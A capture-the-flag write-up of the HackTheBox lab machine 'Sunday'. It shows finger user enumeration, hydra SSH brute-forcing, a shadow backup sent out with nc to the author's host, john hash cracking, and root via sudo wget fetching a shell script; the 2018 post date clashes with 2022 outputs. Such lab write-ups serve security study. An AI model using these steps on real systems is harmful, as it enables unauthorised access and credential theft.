---
layout: post
title: HackTheBox Sunday
date: 2018-04-28
tags: [HackTheBox, Linux]
---

# Machine Synopsis

Sunday is a fairly simple machine, however it uses fairly old software and can be a bit unpredictable at times. It mainly focuses on exploiting the Finger service as well as the use of weak credentials. ([Source](https://www.hackthebox.com/machines/sunday))

# Enumeration

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Sunday]
└─# nmap -p- 10.10.10.76 --max-retries 0
Nmap scan report for 10.10.10.76
Host is up (0.010s latency).
Not shown: 63974 filtered tcp ports (no-response), 1557 closed tcp ports (reset)
PORT      STATE SERVICE
79/tcp    open  finger
515/tcp   open  printer
6787/tcp  open  smc-admin
22022/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 164.79 seconds

┌──(root㉿shiro)-[/home/shiro/HackTheBox/Sunday]
└─# nmap -sC -sV -A -p 79,515,6787,22022 10.10.10.76
NSE Timing: About 99.64% done; ETC: 20:52 (0:00:00 remaining)
Nmap scan report for 10.10.10.76
Host is up (0.0072s latency).

PORT      STATE SERVICE        VERSION
79/tcp    open  finger?
| fingerprint-strings: 
|   GenericLines: 
|     No one logged on
|   GetRequest: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|   HTTPOptions: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|     OPTIONS ???
|   Help: 
|     Login Name TTY Idle When Where
|     HELP ???
|   RTSPRequest: 
|     Login Name TTY Idle When Where
|     OPTIONS ???
|_    RTSP/1.0 ???
|_finger: ERROR: Script execution failed (use -d to debug)
515/tcp   open  printer
6787/tcp  open  ssl/smc-admin?
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=sunday
| Subject Alternative Name: DNS:sunday
| Not valid before: 2021-12-08T19:40:00
|_Not valid after:  2031-12-06T19:40:00
22022/tcp open  ssh            OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey: 
|_  256 da:2a:6c:fa:6b:b1:ea:16:1d:a6:54:a1:0b:2b:ee:48 (ED25519)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port79-TCP:V=7.92%I=7%D=7/24%Time=62DD4042%P=x86_64-pc-linux-gnu%r(Gene
SF:ricLines,12,"No\x20one\x20logged\x20on\r\n")%r(GetRequest,93,"Login\x20
SF:\x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x2
SF:0\x20When\x20\x20\x20\x20Where\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nGET\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\
SF:?\r\nHTTP/1\.0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:?\?\?\r\n")%r(Help,5D,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\nHELP\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\?\?\?\r\n")%r(HTTPOptions,93,"Login\x20\x20\x20\x20\x20\x20\x20Name\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\
SF:r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\?\?\?\r\nHTTP/1\.0\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\?\?\?\r\nOPTIONS\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n")%r(RTSPRequest,93,"Login\x20\x20
SF:\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x2
SF:0When\x20\x20\x20\x20Where\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nOPTIONS\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nRTSP/1\.0\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: WAP|phone
Running: Linux 2.4.X|2.6.X, Sony Ericsson embedded
OS CPE: cpe:/o:linux:linux_kernel:2.4.20 cpe:/o:linux:linux_kernel:2.6.22 cpe:/h:sonyericsson:u8i_vivaz
OS details: Tomato 1.28 (Linux 2.4.20), Tomato firmware (Linux 2.6.22), Sony Ericsson U8i Vivaz mobile phone

TRACEROUTE (using port 6787/tcp)
HOP RTT    ADDRESS
1   ... 30

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 145.86 seconds
```

>   For this `nmap` scan, it took too long when I did the usual `nmap -sC -sV -A -p- <ip>`. So I changed my tactic and scanned for the open ports first with no retries, and then proceed to scan those open ports!

Hmm, it seems like there’s a `finger` service open.

Let’s check out more about this service from [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-finger).

>   **Finger** is a program you can use to find information about computer users.

Let’s do a basic user enumeration!

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Sunday]
└─# finger @10.10.10.76
No one logged on
```

It seems like there’s no one logged on now. No problem, we can use `finger-user-enum` from [PentestMonkey](https://pentestmonkey.net/tools/user-enumeration/finger-user-enum) to enumerate!

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Sunday/finger-user-enum-1.0]
└─# ./finger-user-enum.pl -h                                              
finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )

Usage: finger-user-enum.pl [options] ( -u username | -U file-of-usernames ) ( -t host | -T file-of-targets )

options are:
        -m n     Maximum number of resolver processes (default: 5)
	-u user  Check if user exists on remote system
	-U file  File of usernames to check via finger service
	-t host  Server host running finger service
	-T file  File of hostnames running the finger service
	-r host  Relay.  Intermediate server which allows relaying of finger requests.
	-p port  TCP port on which finger service runs (default: 79)
	-d       Debugging output
	-s n     Wait a maximum of n seconds for reply (default: 5)
	-v       Verbose
	-h       This help message

Also see finger-user-enum-user-docs.pdf from the finger-user-enum tar ball.

Examples:

$ finger-user-enum.pl -U users.txt -t 10.0.0.1
$ finger-user-enum.pl -u root -t 10.0.0.1
$ finger-user-enum.pl -U users.txt -T ips.txt

┌──(root㉿shiro)-[/home/shiro/HackTheBox/Sunday/finger-user-enum-1.0]
└─# ./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.76
Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Worker Processes ......... 5
Usernames file ........... /usr/share/seclists/Usernames/Names/names.txt
Target count ............. 1
Username count ........... 10177
Target TCP port .......... 79
Query timeout ............ 5 secs
Relay Server ............. Not used
...
root@10.10.10.76: root     Super-User            console      <Dec 19, 2021>..
sammy@10.10.10.76: sammy           ???            ssh          <Apr 13 13:38> 10.10.14.13         ..
sunny@10.10.10.76: sunny           ???            ssh          <Apr 13 13:52> 10.10.14.13         ..
...
16 results.

10177 queries in 409 seconds (24.9 queries / sec)

```

Looks like there are 2 user accounts that we can play with!

Lets get the information of these users using `finger`.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Sunday]
└─# finger sammy@10.10.10.76
Login       Name               TTY         Idle    When    Where
sammy           ???            ssh          <Apr 13 13:38> 10.10.14.13   

┌──(root㉿shiro)-[/home/shiro/HackTheBox/Sunday]
└─# finger sunny@10.10.10.76
Login       Name               TTY         Idle    When    Where
sunny           ???            ssh          <Apr 13 13:52> 10.10.14.13
```

# Exploit

Now, lets try `ssh` using `sunny`'s account!

However, it is password locked. Lets try using `hydra` to bruteforce the password for `sunny`!

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Sunday]
└─# hydra -l sunny -P /usr/share/wordlists/rockyou.txt 10.10.10.76 ssh -s 22022 -f
...
[DATA] attacking ssh://10.10.10.76:22022/
[22022][ssh] host: 10.10.10.76   login: sunny   password: sunday
...
```

Great! We found the password for `sunny`. Lets try `ssh` again.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Sunday]
└─# ssh sunny@10.10.10.76 -p 22022
(sunny@10.10.10.76) Password:sunday 
Warning: 4 failed authentication attempts since last successful authentication.  The latest at Sun Jul 24 12:01 2022.
Last login: Sun Jul 24 12:01:55 2022 from 10.10.14.5
Oracle Corporation      SunOS 5.11      11.4    Aug 2018
sunny@sunday:~$ 
```

# Privilege Escalation

As always, we should check the sudo privileges of `sunny`.

```bash
sunny@sunday:~$ sudo -l
User sunny may run the following commands on sunday:
    (root) NOPASSWD: /root/troll
sunny@sunday:~$ sudo /root/troll
testing
uid=0(root) gid=0(root)
```

I guess we got trolled? Lets check for any interesting files instead.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Sunday]
└─# ssh sunny@10.10.10.76 -p 22022                               
(sunny@10.10.10.76) Password: 
...
sunny@sunday:~$ ls -la /
total 1858
drwxr-xr-x  25 root     sys           28 Jul 24 11:09 .
drwxr-xr-x  25 root     sys           28 Jul 24 11:09 ..
drwxr-xr-x   2 root     root           4 Dec 19  2021 backup
lrwxrwxrwx   1 root     root           9 Dec  8  2021 bin -> ./usr/bin
drwxr-xr-x   5 root     sys            9 Dec  8  2021 boot
drwxr-xr-x   2 root     root           4 Dec 19  2021 cdrom
drwxr-xr-x 219 root     sys          219 Jul 24 11:08 dev
drwxr-xr-x   4 root     sys            5 Jul 24 11:08 devices
drwxr-xr-x  81 root     sys          173 Jul 24 12:04 etc
drwxr-xr-x   3 root     sys            3 Dec  8  2021 export
dr-xr-xr-x   4 root     root           4 Dec 19  2021 home
drwxr-xr-x  21 root     sys           21 Dec  8  2021 kernel
drwxr-xr-x  11 root     bin          342 Dec  8  2021 lib
drwxr-xr-x   2 root     root           3 Jul 24 11:09 media
drwxr-xr-x   2 root     sys            2 Aug 17  2018 mnt
dr-xr-xr-x   1 root     root           1 Jul 24 11:09 net
dr-xr-xr-x   1 root     root           1 Jul 24 11:09 nfs4
drwxr-xr-x   2 root     sys            2 Aug 17  2018 opt
drwxr-xr-x   4 root     sys            4 Aug 17  2018 platform
dr-xr-xr-x  82 root     root      480032 Jul 24 12:09 proc
drwx------   2 root     root          10 Apr 13 13:39 root
drwxr-xr-x   3 root     root           3 Dec  8  2021 rpool
lrwxrwxrwx   1 root     root          10 Dec  8  2021 sbin -> ./usr/sbin
drwxr-xr-x   7 root     root           7 Dec  8  2021 system
drwxrwxrwt   3 root     sys          276 Jul 24 12:09 tmp
drwxr-xr-x  29 root     sys           41 Dec  8  2021 usr
drwxr-xr-x  42 root     sys           51 Dec  8  2021 var
-r--r--r--   1 root     root      298504 Aug 17  2018 zvboot
sunny@sunday:~$ ls -la /backup
total 28
drwxr-xr-x   2 root     root           4 Dec 19  2021 .
drwxr-xr-x  25 root     sys           28 Jul 24 11:09 ..
-rw-r--r--   1 root     root         319 Dec 19  2021 agent22.backup
-rw-r--r--   1 root     root         319 Dec 19  2021 shadow.backup
```

Ah! It looks like there are some interesting files in `/backup`.

```bash
sunny@sunday:/backup$ cat shadow.backup 
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

Could these hashes be cracked? Lets transfer the file to our machine using netcat!

```bash
- Own Terminal - 
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Sunday]
└─# nc -l -p 1234 > shadow.backup  

- SSH Shell -
sunny@sunday:/backup$ nc -w 3 10.10.14.5 1234 < shadow.backup 

- Own Terminal - 
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Sunday]
└─# ls
finger-user-enum-1.0  shadow.backup
```

Alright! Now, we can use `john` to try and crack the hashes.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Sunday]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt shadow.backup 
...
sunday           (sunny)     
cooldude!        (sammy)     
...
```

Nice! We got the password for `sammy`.

Lets `su` to `sammy` and see what can she do!

```bash
sunny@sunday:~$ su sammy
Password: cooldude!
sammy@sunday:~$ sudo -l
User sammy may run the following commands on sunday:
    (ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

Hmm.. it seems like she can run `wget` with privileges. Shall we write a new `troll` script to execute a bash shell?

```bash
- Own Terminal -
┌──(root㉿shiro)-[/home/shiro/HackTheBox/Sunday]
└─# cat troll   
#!/usr/bin/bash
bash

┌──(root㉿shiro)-[/home/shiro/HackTheBox/Sunday]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.76 - - [24/Jul/2022 20:29:33] "GET /troll HTTP/1.1" 200 -

- SSH Shell -
sammy@sunday:~$ sudo wget http://10.10.14.5/troll -O /root/troll
sammy@sunday:~$ sudo /root/troll
Password: 
sammy@sunday:~$ ps aux
USER       PID %CPU %MEM   SZ  RSS TT       S    START  TIME COMMAND
...
root       119  0.0  0.212544 3160 ?        S 11:08:59  0:00 /usr/bin/bash /lib/svc/method/overwrite
...
sammy@sunday:~$ cat /lib/svc/method/overwrite
cat: cannot open /lib/svc/method/overwrite: Permission denied
```

Seems like we can’t `cat` the file due to restricted privileges. However, `wget` can be used to read files as well using `-i`!

```bash
sammy@sunday:~$ sudo wget -i /lib/svc/method/overwrite
/lib/svc/method/overwrite: Invalid URL http://#!/usr/bin/bash: Invalid host name
/lib/svc/method/overwrite: Invalid URL /usr/gnu/bin/cat /root/troll.original > /root/troll: Scheme missing
/lib/svc/method/overwrite: Invalid URL /usr/gnu/bin/sleep 5: Scheme missing
--2022-07-24 12:33:51--  http://while%20true;%20do/
Resolving while true; do (while true; do)... failed: temporary name resolution failure.
wget: unable to resolve host address 'while true; do'
--2022-07-24 12:33:51--  http://done/
Resolving done (done)... failed: temporary name resolution failure.
wget: unable to resolve host address 'done'
```

Oh! It looks like the `overwrite` file is overwriting the `bash` file from `troll.original`.

So the file we should be replacing is `troll.original` and not `troll`!

```bash
sammy@sunday:~$ sudo wget http://10.10.14.5/troll -O /root/troll.original 
```

Finally, we wait for awhile for the `overwrite` script to run before we can run the new `troll` program.

```bash
sammy@sunday:~$ sudo /root/troll
Password: cooldude!
root@sunday:/home/sunny# cd ..
root@sunday:/home# ls
sammy  sunny
root@sunday:/home/sammy# cd ..
root@sunday:/home# cat /home/sammy/user.txt 
a3d9498027ca5187ba1793943ee8a598
root@sunday:/home# cat /root/root.txt 
fb40fab61d99d37536daeec0d97af9b8
```
